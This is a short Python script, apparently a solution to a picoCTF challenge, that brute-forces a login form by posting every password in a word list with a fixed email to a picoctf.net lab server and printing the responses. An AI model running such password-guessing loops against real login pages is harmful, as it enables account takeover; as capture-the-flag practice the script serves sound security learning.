import requests

url = "http://amiable-citadel.picoctf.net:60069"

login_endpoint = url + "/login"

with open("passwords.txt", "r") as f:
    list_password = f.read().split()

known_email = "ctf-player@picoctf.org"

get_url = requests.get(url=url)
# print(get_url.text)

for pw in list_password:
    try:
        data = {
            "email": known_email,
            "password": pw
        }

        login = requests.post(url=login_endpoint, data=data)
        res = print(login.text)

    except:
        pass